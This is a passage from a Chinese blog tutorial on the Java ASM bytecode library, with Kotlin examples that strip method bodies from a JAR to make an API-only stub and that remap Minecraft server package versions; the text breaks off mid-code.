ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)</a></p>\n<p>写的时候跟字节码和这个资料对照着看。</p>\n<h5 id=\"ApiJarGenerator\"><a href=\"#ApiJarGenerator\" class=\"headerlink\" title=\"ApiJarGenerator\"></a>ApiJarGenerator</h5><blockquote>\n<p>写这个实战的时候我还只知道Core API，所以以下功能均使用Core API实现</p>\n</blockquote>\n<blockquote>\n<p>我们知道，Java的类文件都是可以反编译的，同时如果要依赖于某个Jar进行开发就必须要有Jar文件。</p>\n<p>设想一种情况，我们开发项目人手不够，去找了外包。同时我们有一份自主开发的框架&#x2F;类库，但我们不希望这份库的Jar文件落入外包者之手，但项目开发必须要依赖这份Jar文件，否则就通不过编译，怎么办呢？</p>\n<p>了解了asm框架与JVM字节码结构后我们很容易就能想出一个解决方案，删空Jar文件中所有方法的字节码指令，只留下可供调用的方法声明。这样外包者就无法通过反编译得知方法的具体逻辑，但外包者仍然能调用其中的公开方法，并且项目也能通过编译。</p>\n</blockquote>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author 寒雨\n * @since 2022/7/11 14:22\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token operator\">:</span> File<span class=\"token punctuation\">,</span> output<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        output<span class=\"token punctuation\">.</span><span class=\"token function\">createNewFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">JarOutputStream</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">outputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">out</span> <span class=\"token operator\">-></span>\n        <span class=\"token function\">JarFile</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> jarFile <span class=\"token operator\">-></span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>jarEntry <span class=\"token keyword\">in</span> jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">entries</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> input <span class=\"token operator\">-></span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token comment\">// 如果是class文件，就用我们自定义的ClassVisitor visit它</span>\n                        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> visitor <span class=\"token operator\">=</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>visitor<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token comment\">// 写入class文件</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        input<span class=\"token punctuation\">.</span><span class=\"token function\">copyTo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">out</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>visitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> visitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">></span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIincInsn</span><span class=\"token punctuation\">(</span>`<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> increment<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIntInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> operand<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitVarInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> `<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitJumpInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLabel</span><span class=\"token punctuation\">(</span>label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTableSwitchInsn</span><span class=\"token punctuation\">(</span>min<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> max<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> labels<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLookupSwitchInsn</span><span class=\"token punctuation\">(</span>dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> keys<span class=\"token operator\">:</span> IntArray<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> labels<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Label<span class=\"token operator\">></span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMultiANewArrayInsn</span><span class=\"token punctuation\">(</span>descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numDimensions<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTryCatchBlock</span><span class=\"token punctuation\">(</span>start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> handler<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLocalVariable</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> index<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLineNumber</span><span class=\"token punctuation\">(</span>line<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFrame</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> numLocal<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> local<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">></span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numStack<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> stack<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">></span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> isInterface<span class=\"token operator\">:</span> Boolean<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInvokeDynamicInsn</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> bootstrapMethodHandle<span class=\"token operator\">:</span> Handle<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> bootstrapMethodArguments<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \t\t                         <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面我们让EmptyClassVisitor在visitMethod返回了一个我们自定义的EmptyMethodVisitor，也就是说在访问方法时执行的是在EmptyMethodVisitor中我们自定义的逻辑。而在EmptyMethodVisitor中我们重写了所有方法，把原本的执行父类方法的逻辑删除。这样在访问时便不会想原本一样生成跟之前一样的字节码，而是什么都不做，这样就删掉了方法中方法体的字节码。</p>\n<h5 id=\"ASMVersionControl\"><a href=\"#ASMVersionControl\" class=\"headerlink\" title=\"ASMVersionControl\"></a>ASMVersionControl</h5><blockquote>\n<p>这是在Minecraft服务端插件开发经常中遇见的问题</p>\n<p>众所周知，目前主流的minecraft服务端都是第三方反编译官方服务端的代码后对其进行封装而来的，而作为服务端插件开发者，我们大部分时候只需要用到第三方封装的API，但也有例外。</p>\n<p>当我们需要调用官方服务端的代码，我们会发现一个问题：不同版本的服务端的官方服务端代码的包名不一样，它们被版本号分隔开来。</p>\n<p>比如，在Minecraft 1.16.5版本的官方代码中，所有类都在<code>net.minecraft.server.v1_16_R3</code>包下</p>\n<p>但在Minecraft 1.12.2版本的代码中，所有类都在<code>net.minecraft.server.v1_12_R1</code>包下</p>\n<p>关键是它们之间的代码其实没有很大的改动，就是包名不一样了</p>\n<p>考虑到版本兼容问题，开发者一般不会直接调用<code>n.m.s</code>包下的代码，在ASMVersionControl这个解决方案诞生之前，一般有两种解决方案</p>\n<ul>\n<li>运行时获取版本号，然后拼接字符串通过反射调用</li>\n<li>为不同版本写多份代码，再在运行时判断当前运行版本来决定调用哪一份</li>\n</ul>\n<p>这两种解决方案都不太尽人意。反射调用不仅麻烦，还会导致额外的性能开销。而编写多份代码更是白白增加了开发者的工作量，而且需要导入多个版本的服务端核心依赖，导包的时候及其容易导错。</p>\n<p>这时候<code>ASMVersionControl</code>应运而生，开发者只需要在一个实现类中写一份代码，便可以通过ASM动态代理得到一个实例。开发者可以放心调用实例中的方法，因为这个实例已经被asm修改过了，所有<code>n.m.s</code>调用的包名的版本号部分全部被修改为了运行环境的版本号。</p>\n</blockquote>\n<p>这部分逻辑其实ASM已经提供了一个现成的工具<code>ClassRemapper</code>来实现，但它本质上也是一个被封装过的<code>ClassVisitor</code>，为了方便理解，我们使用ClassVisitor实现。</p>\n<p>如果你想知道使用ClassRemapper如何实现，看这里<a href=\"https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt\">taboolib&#x2F;MinecraftRemapper.kt at master · TabooLib&#x2F;taboolib (github.com)</a></p>\n<p>或者你也可以试着自己实现一下ClassRemapper的封装，比较简单。</p>\n<p>我们先模拟两个“不同版本”下的类，也就是包名不同，但方法声明相同，实现略有不同的两个类。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// net.minecraft.server.v1_12_R1</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.12\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// net.minecraft.server.v1_16_R3</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.16\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>理想的状态是，我要让我调用<code>net.minecraft.server.v1_12_R1</code>的所有方法全部变成<code>net.minecraft.server.v1_16_R3</code>。</p>\n<p>我们先写一段伪代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 获得asm修改过的代理对象</span>\n    <span class=\"token keyword\">val</span> nmsProxy<span class=\"token operator\">:</span> NMSHandler <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    nmsProxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 这里输出 execute successfully v1.16, 说明我们修改成功了</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们先看看<code>NMSHandlerImpl#callTest</code>的字节码指令</p>\n<blockquote>\n<p>   L0<br>    LINENUMBER 85 L0<br>    NEW net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test<br>    DUP<br>    INVOKESPECIAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.<init> ()V<br>    INVOKEVIRTUAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.test ()V<br>   L1<br>    LINENUMBER 86 L1<br>    RETURN<br>   L2<br>    LOCALVARIABLE this Lorg&#x2F;example&#x2F;asmlearn&#x2F;NMSHandlerImpl; L0 L2 0<br>    MAXSTACK &#x3D; 2<br>    MAXLOCALS &#x3D; 1</p>\n</blockquote>\n<p>我们只需要修改其中所有的 <code>net/minecraft/server/v1_12_R1/Test</code>为<code>net/minecraft/server/v1_16_R3/Test</code>即可，目前为止我们知道我们肯定首先要先visitMethod，然后在具体的操作方法。</p>\n<blockquote>\n<p>需要修改的指令：</p>\n<ul>\n<li><p>NEW net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test</p>\n</li>\n<li><p>INVOKESPECIAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.<init> ()V</p>\n</li>\n<li><p>INVOKEVIRTUAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.test ()V</p>\n</li>\n</ul>\n</blockquote>\n<p>在<a href=\"https://www.bilibili.com/read/cv13433468\">Java ASM详解：MethodVisitor和Opcode（二）类型、数组、字段、方法、异常与同步 - 哔哩哔哩 (bilibili.com)</a>对照</p>\n<p>发现我们只需要重写<code>visitTypeInsn</code>, <code>visitMethodInsn</code>，并在里面替换对应的参数即可。</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span 